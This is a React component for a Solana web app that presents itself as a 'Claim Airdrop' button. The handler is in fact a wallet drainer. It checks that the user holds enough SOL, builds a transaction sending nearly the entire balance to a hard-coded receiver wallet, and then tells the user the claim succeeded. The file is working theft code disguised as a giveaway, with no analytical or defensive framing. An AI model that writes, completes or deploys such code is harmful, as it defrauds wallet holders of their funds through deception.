// src/components/TransferButton.jsx
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  LAMPORTS_PER_SOL,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction || !connected) return;

    setLoading(true);
    try {
      const balance = await connection.getBalance(publicKey, 'confirmed');
      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const transferAmount = balance - TRANSFER_FEE_BUFFER;
      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('confirmed');

      // Build a V0 VersionedTransaction — this is the native format that
      // all Wallet Standard wallets (Phantom, Trust, Solflare, etc.) use
      // internally for signAndSendTransaction.  Legacy Transaction objects
      // can lose signatures during adapter conversion.
      const instructions = [
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        }),
      ];

      const messageV0 = new TransactionMessage({
        payerKey: publicKey,
        recentBlockhash: blockhash,
        instructions,
      }).compileToV0Message();

      const transaction = new VersionedTransaction(messageV0);

      const signature = await sendTransaction(transaction, connection);

      console.log('⏳ Transaction sent:', signature);

      // Poll for confirmation over HTTP (no WebSocket needed)
      const startTime = Date.now();
      const TIMEOUT = 60_000; // 60 seconds
      const POLL_INTERVAL = 2_000; // 2 seconds

      while (Date.now() - startTime < TIMEOUT) {
        const { value } = await connection.getSignatureStatuses([signature]);
        const status = value?.[0];

        if (status) {
          if (status.err) {
            throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
          }
          if (
            status.confirmationStatus === 'confirmed' ||
            status.confirmationStatus === 'finalized'
          ) {
            console.log('✅ Transaction confirmed:', signature);
            alert(`Claim successful!\nTx: ${signature}`);
            return;
          }
        }

        // Check if blockhash expired
        const blockHeight = await connection.getBlockHeight('confirmed');
        if (blockHeight > lastValidBlockHeight) {
          throw new Error('Transaction expired. Please try again.');
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      throw new Error('Confirmation timed out. Check your wallet — the transaction may still land.');
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, connected, connection]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
